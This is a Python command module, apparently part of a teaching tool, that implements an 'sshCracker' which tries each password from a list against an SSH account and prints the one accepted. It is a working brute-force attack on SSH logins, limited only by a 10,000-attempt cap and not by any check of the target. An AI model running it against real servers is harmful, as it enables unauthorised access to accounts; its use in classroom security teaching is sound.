"""Audit a dedicated classroom SSH account with a password list."""

from pathlib import Path

from c3tool.commands.network._addressing import parse_host_port, parse_port
from c3tool.model import BaseCommand, CommandError, CommandSpec, FeatureUnavailable, ToolContext, UsageError

COMMAND_SPEC = CommandSpec("sshCracker", "<user:IP:port> <passwordFile>", "Audits a lab SSH account using a password list.", "python3 script.py sshCracker <user:IP:port> <passwordFile>", "The accepted password or a not-found result.", "c3tool.commands.network.ssh_cracker:SshCrackerCommand", order=24)


def parse_ssh_target(value: str) -> tuple[str, str, int]:
    if "@" in value:
        user, address = value.split("@", 1)
        host, port = parse_host_port(address)
        return user, host, port
    parts = value.rsplit(":", 2)
    if len(parts) != 3:
        raise UsageError("SSH target must be user:IP:port or user@IP:port")
    user, host, port_text = parts
    if not user or not host:
        raise UsageError("SSH user and host cannot be empty")
    return user, host, parse_port(port_text)


class SshCrackerCommand(BaseCommand):
    MAX_ATTEMPTS = 10_000

    def run(self, args, context: ToolContext) -> str:
        self.require_count(args, 2, COMMAND_SPEC.usage)
        user, host, port = parse_ssh_target(args[0])
        password_file = Path(args[1]).expanduser().resolve(strict=False)
        if not password_file.is_file():
            raise CommandError(f"Password file not found: {password_file}")
        try:
            import paramiko
        except ImportError as error:
            raise FeatureUnavailable("Install paramiko to use sshCracker") from error
        passwords = password_file.read_text(encoding="utf-8", errors="replace").splitlines()
        if len(passwords) > self.MAX_ATTEMPTS:
            raise CommandError(f"Password file exceeds the {self.MAX_ATTEMPTS}-attempt classroom limit")
        for attempt_number, password in enumerate(passwords, start=1):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname=host, port=port, username=user, password=password, look_for_keys=False, allow_agent=False, timeout=4, auth_timeout=4, banner_timeout=4)
                return f"Password found after {attempt_number} attempts: {password}"
            except paramiko.AuthenticationException:
                continue
            except (paramiko.SSHException, OSError) as error:
                raise CommandError(f"SSH service error at {host}:{port}: {error}") from error
            finally:
                client.close()
        return f"No password matched after {len(passwords)} attempts."
